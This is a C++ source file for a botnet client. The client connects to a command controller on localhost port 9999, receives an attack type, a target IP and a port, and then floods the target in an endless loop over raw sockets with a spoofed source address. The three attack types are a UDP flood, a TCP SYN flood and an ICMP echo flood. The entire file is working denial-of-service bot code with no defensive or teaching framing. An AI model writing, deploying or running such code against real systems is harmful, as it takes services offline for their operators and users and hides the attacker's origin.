#include <iostream>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <sys/socket.h>

using namespace std;

// Calculate checksum
unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    short oddbyte;
    int answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) &oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

int main() {

    int sock_c = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_c < 0) {
        cerr << "Socket creation failed." << endl;
        return 1;
    }

    sockaddr_in controllerAddr{};
    controllerAddr.sin_family = AF_INET;
    controllerAddr.sin_port = htons(9999);

    controllerAddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 

    if (connect(sock_c, (sockaddr*)&controllerAddr, sizeof(controllerAddr)) < 0) {
        cerr << "Connection to controller failed" << endl;
        return 1;
    }

    cout << "BOT 1: Connected to controller." << endl;
    
    
        int ch,TP,targetPort;
        char ipBuffer[16] = {0};
        
        int bytes = recv(sock_c, &ch, sizeof(ch), 0);
        if (bytes <= 0) {
            cerr << "Lost connection to controller" << endl;
            
        }
        
        recv(sock_c, ipBuffer, sizeof(ipBuffer), 0);
        string targetIP = ipBuffer;
        
        int received = recv(sock_c, &TP, sizeof(TP), 0);
        if (received <= 0) {
        cerr << " Failed to receive port.\n";
        } else {
        targetPort = TP; 
        cout << "[BOT] Target port received: " << targetPort << endl;
        }
        
    switch(ch) {

    case 1:{
    
    if (targetIP.empty() || targetPort == 0) {
        cerr << "No suitable target found!" << endl;
        return 1;
    }

    cout << "[+] Target acquired: " << targetIP << ":" << targetPort << endl;
    // Create raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        cerr << "Socket creation failed" << endl;
        return 1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cerr << "Error setting IP_HDRINCL" << endl;
        return 1;
    }

    char datagram[4096];
    memset(datagram, 0, 4096);

    // IP header
    struct iphdr *iph = (struct iphdr *) datagram;

    // UDP header
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof(struct iphdr));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(targetPort); // Target port
    sin.sin_addr.s_addr = inet_addr(targetIP.c_str()); // Target IP

    // Fill IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0; // Kernel fills this
    iph->saddr = inet_addr("192.168.1.100"); // Spoofed IP
    iph->daddr = sin.sin_addr.s_addr;

    // Fill TCP header
    udph->source = htons(1234); // Source port
    udph->dest = htons(targetPort); // Destination port
    udph->len = htons(sizeof(struct udphdr)); // Header size
    udph->check = 0; // Will calculate below

    // Pseudo header for checksum
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t udp_length;
    };

    struct pseudo_header psh;
    psh.source_address = inet_addr("192.168.1.100");
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = udph->len;

    char pseudogram[1024];
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr));

    udph->check = checksum((unsigned short *) pseudogram, sizeof(struct pseudo_header) + sizeof(struct udphdr));

    // Send packet
    while(true){
    if (sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
        cerr << "sendto failed" << endl;
    } else {
       cout << "UDP packet sent!" << endl;
       usleep(1000);
    }}

    close(sock);

    break;}
    
    case 2:{
    
    if (targetIP.empty() || targetPort == 0) {
        cerr << "No suitable target found!" << endl;
        return 1;
    }

    cout << "[+] Target acquired: " << targetIP << ":" << targetPort << endl;
    // Create raw socket
    int sock_T = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_T < 0) {
        cerr << "Socket creation failed" << endl;
        return 1;
    }

    int one_T = 1;
    if (setsockopt(sock_T, IPPROTO_IP, IP_HDRINCL, &one_T, sizeof(one_T)) < 0) {
        cerr << "Error setting IP_HDRINCL" << endl;
        return 1;
    }

    char datagram_T[4096];
    memset(datagram_T, 0, 4096);

    // IP header
    struct iphdr *iphT = (struct iphdr *) datagram_T;

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (datagram_T + sizeof(struct iphdr));

    struct sockaddr_in sins;
    sins.sin_family = AF_INET;
    sins.sin_port = htons(targetPort); // Target port
    sins.sin_addr.s_addr = inet_addr(targetIP.c_str()); // Target IP

    // Fill IP header
    iphT->ihl = 5;
    iphT->version = 4;
    iphT->tos = 0;
    iphT->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iphT->id = htons(54321);
    iphT->frag_off = 0;
    iphT->ttl = 64;
    iphT->protocol = IPPROTO_TCP;
    iphT->check = 0; // Kernel fills this
    iphT->saddr = inet_addr("192.168.1.100"); // Spoofed IP
    iphT->daddr = sins.sin_addr.s_addr;

    // Fill TCP header
    tcph->source = htons(1234); // Source port
    tcph->dest = htons(targetPort); // Destination port
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->doff = 5; // Header size
    tcph->syn = 1; // SYN flag set
    tcph->window = htons(5840);
    tcph->check = 0; // Will calculate below
    tcph->urg_ptr = 0;

    // Pseudo header for checksum
    struct pseudo_headers {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    };

    struct pseudo_headers pshT;
    pshT.source_address = inet_addr("192.168.1.100");
    pshT.dest_address = sins.sin_addr.s_addr;
    pshT.placeholder = 0;
    pshT.protocol = IPPROTO_TCP;
    pshT.tcp_length = htons(sizeof(struct tcphdr));

    char pseudo[1024];
    memcpy(pseudo, &pshT, sizeof(struct pseudo_headers));
    memcpy(pseudo + sizeof(struct pseudo_headers), tcph, sizeof(struct tcphdr));

    tcph->check = checksum((unsigned short *) pseudo, sizeof(struct pseudo_headers) + sizeof(struct tcphdr));

    // Send packet
    while(true){
    if (sendto(sock_T, datagram_T, iphT->tot_len, 0, (struct sockaddr *) &sins, sizeof(sins)) < 0) {
        cerr << "sendto failed" << endl;
    } else {
        cout << "TCP SYN packet sent!" << endl;
        usleep(1000);
    }}

    close(sock_T);
    break;}
    
    case 3:{
    
    if (targetIP.empty()) {
        cerr << "No suitable target found!" << endl;
        return 1;
    }

    cout << "[+] Target acquired: " << targetIP << endl;
    // Create raw socket
    int sock_T = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock_T < 0) {
        cerr << "Socket creation failed" << endl;
        return 1;
    }

    int one_T = 1;
    if (setsockopt(sock_T, IPPROTO_IP, IP_HDRINCL, &one_T, sizeof(one_T)) < 0) {
        cerr << "Error setting IP_HDRINCL" << endl;
        return 1;
    }

    char datagram_T[4096];
    memset(datagram_T, 0, 4096);

    // IP header
    struct iphdr *iphT = (struct iphdr *) datagram_T;

    // TCP header
    struct icmphdr *icmph = (struct icmphdr*) (datagram_T + sizeof(struct iphdr));

    struct sockaddr_in sins;
    sins.sin_family = AF_INET;
    sins.sin_port = 0; // Target port
    sins.sin_addr.s_addr = inet_addr(targetIP.c_str()); // Target IP

    // Fill IP header
    iphT->ihl = 5;
    iphT->version = 4;
    iphT->tos = 0;
    iphT->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr);
    iphT->id = htons(54321);
    iphT->frag_off = 0;
    iphT->ttl = 64;
    iphT->protocol = IPPROTO_ICMP;
    iphT->check = 0; // Kernel fills this
    iphT->saddr = inet_addr("192.168.1.100"); // Spoofed IP
    iphT->daddr = sins.sin_addr.s_addr;

    // Fill ICMP header
    icmph->type = 8;       
    icmph->code = 0;       
    icmph->un.echo.id = htons(rand());   
    icmph->un.echo.sequence = htons(rand() % 65536); 
    icmph->checksum = 0;
    
    icmph->checksum = checksum((unsigned short *)icmph, sizeof(struct icmphdr));

    iphT->check = checksum((unsigned short *)iphT, sizeof(struct iphdr));

    // Send ICMP packet in a loop
    while (true) {
    if (sendto(sock_T, datagram_T, iphT->tot_len, 0,(struct sockaddr *) &sins, sizeof(sins)) < 0) {
        std::cerr << "sendto failed\n";
    } else {
        std::cout << "ICMP packet sent!\n";
        usleep(1000);}
    }
    break;}
    
    default :{
    
    cout << "Sorry, invalid choice!" << endl;
    break;}
    
    }
    return 0;
}

